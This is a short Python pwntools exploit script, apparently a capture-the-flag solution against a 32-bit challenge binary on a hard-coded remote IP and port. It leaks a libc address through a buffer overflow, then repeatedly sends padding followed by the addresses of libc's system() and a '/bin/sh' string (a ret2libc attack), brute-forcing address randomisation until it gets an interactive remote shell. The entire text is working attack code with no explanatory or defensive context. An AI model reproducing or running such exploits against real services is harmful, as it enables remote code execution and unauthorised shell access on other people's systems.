from pwn import *
from struct import *

elf = ELF('libc.so.6')

binaddr = next(elf.search('/bin/sh'))
# binaddr = 0x15FA0F
systemaddr = elf.symbols['system']
# systemaddr = 0x3B060
poprdi = 0x000177db
libcmainoff = 0x18637


def leakaddr(pl):
    with remote('163.172.176.29', 9036) as p:
        # with remote('163.172.176.29', 9036) as p:
        # with process('./32_chal') as p:
        # with remote('163.172.176.29', 9036) as p:
        try:
            print p.recvline()
            p.sendline(pl)
            print p.recvline()
            return p.recvall()
        except:
            return ''


def attack(pl):
    with remote('163.172.176.29', 9036) as p:
        # with remote('163.172.176.29', 9036) as p:
        # with process('./32_chal') as p:
        # with remote('163.172.176.29', 9036) as p:
        # try:
        print p.recvline()
        p.sendline(pl)
        print p.recvline()
        p.interactive()
        # except:
        # return ''


def libcaddr():
    adr = leakaddr('aaaa' * 27 + 'aaa')
    return struct.unpack('<I', adr[:4])[0] - libcmainoff


def bruteforce():
    while(True):
        try:
            libc = 0xf7591000
            systemadr = 0xf75cb940
            binadr = 0xf76ea00b
            attack('aaaa' * 28 + p32(systemadr) + 'aaaa' + p32(binadr))
        except:
            print 'continue'


        # for i in range(0, 256):
        #    libc = libcaddr()
        #    print hex(libc)
        # print hex(systemaddr + libc)
        # print hex(binaddr + libc)
bruteforce()
#attack('aaaa' * 3)
#attack('aaaa' * 28 + p32(systemaddr + libc) + 'aaaa' + p32(binaddr + libc))
